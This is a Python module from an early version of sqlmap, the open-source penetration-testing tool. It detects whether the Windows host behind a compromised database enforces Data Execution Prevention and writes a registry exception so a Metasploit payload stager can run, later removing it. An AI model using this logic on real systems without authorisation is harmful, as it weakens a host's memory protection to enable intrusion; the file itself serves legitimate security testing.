#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.data import kb
from lib.core.data import logger
from lib.core.session import setDEP


class DEP:
    """
    This class defines methods to handle DEP (Data Execution Prevention)

    The following operating systems has DEP enabled by default:
    * Windows XP SP2+
    * Windows Server 2003 SP1+
    * Windows Vista SP0+
    * Windows 2008 SP0+

    References:
    * http://support.microsoft.com/kb/875352
    * http://en.wikipedia.org/wiki/Data_Execution_Prevention
    """

    def __init__(self):
        self.bypassDEP    = False
        self.__supportDEP = False


    def __initVars(self, exe):
        self.__DEPvalues   = {
                               "OPTIN":     "only Windows system binaries are covered by DEP by default",
                               "OPTOUT":    "DEP is enabled by default for all processes, exceptions are allowed",
                               "ALWAYSON":  "all processes always run with DEP applied, no exceptions allowed, giving it a try anyway",
                               "ALWAYSOFF": "no DEP coverage for any part of the system"
                             }
        self.__excRegKey   = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
        self.__excRegValue = exe
        self.__excRegValue = self.__excRegValue.replace("/", "\\")


    def __addException(self):
        infoMsg  = "adding an exception to DEP in the Windows registry "
        infoMsg += "for '%s' executable" % self.__excRegValue

        logger.info(infoMsg)

        if kb.dbms == "PostgreSQL":
            warnMsg  = "by default PostgreSQL server runs as postgres "
            warnMsg += "user which has no privileges to add/delete "
            warnMsg += "Windows registry keys, sqlmap will give it a try "
            warnMsg += "anyway"
            logger.warn(warnMsg)

        self.addRegKey(self.__excRegKey, self.__excRegValue, "REG_SZ", "DisableNXShowUI")


    def delException(self):
        if self.bypassDEP == False:
            return

        infoMsg  = "deleting the exception to DEP in the Windows registry "
        infoMsg += "for Metasploit Framework 3 payload stager"
        logger.info(infoMsg)

        self.delRegKey(self.__excRegKey, self.__excRegValue)


    def __analyzeDEP(self):
        detectedValue = False

        for value, explanation in self.__DEPvalues.items():
            if value in kb.dep:
                detectedValue = True

                if value in ( "OPTIN", "ALWAYSOFF" ):
                    logger.info(explanation)

                    self.bypassDEP = False

                elif value == "OPTOUT":
                    logger.info(explanation)

                    self.bypassDEP = True
                    self.__addException()

                elif value == "ALWAYSON":
                    logger.warn(explanation)

                    self.bypassDEP = True
                    self.__addException()

        if detectedValue == False:
            warnMsg  = "it was not possible to detect the DEP system "
            warnMsg += "policy, sqlmap will threat as if "
            warnMsg += "%s" % self.__DEPvalues["OPTOUT"]
            logger.warn(warnMsg)

            self.__addException()


    def __systemHasDepSupport(self):
        depEnabledOS = {
                         "2003":  ( 1, 2 ),
                         "2008":  ( 0, 1 ),
                         "XP":    ( 2, 3 ),
                         "Vista": ( 0, 1 ),
                       }

        for version, sps in depEnabledOS.items():
            if kb.osVersion == version and kb.osSP in sps:
                self.__supportDEP = True
                break


    def handleDep(self, exe):
        logger.info("handling DEP")

        self.__systemHasDepSupport()

        if self.__supportDEP == True:
            infoMsg  = "the back-end DBMS underlying operating system "
            infoMsg += "supports DEP: going to handle it"
            logger.info(infoMsg)

        elif not kb.osVersion or not kb.osSP:
            warnMsg  = "unable to fingerprint the back-end DBMS "
            warnMsg += "underlying operating system version and service "
            warnMsg += "pack: going to threat as if DEP is enabled"
            logger.warn(warnMsg)

            self.bypassDEP = True

        else:
            infoMsg  = "the back-end DBMS underlying operating system "
            infoMsg += "does not support DEP: no need to handle it"
            logger.info(infoMsg)

            return

        logger.info("checking DEP system policy")

        self.__initVars(exe)

        if not kb.dep:
            kb.dep = self.readRegKey("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control", "SystemStartOptions", True).upper()
            setDEP()

        self.__analyzeDEP()
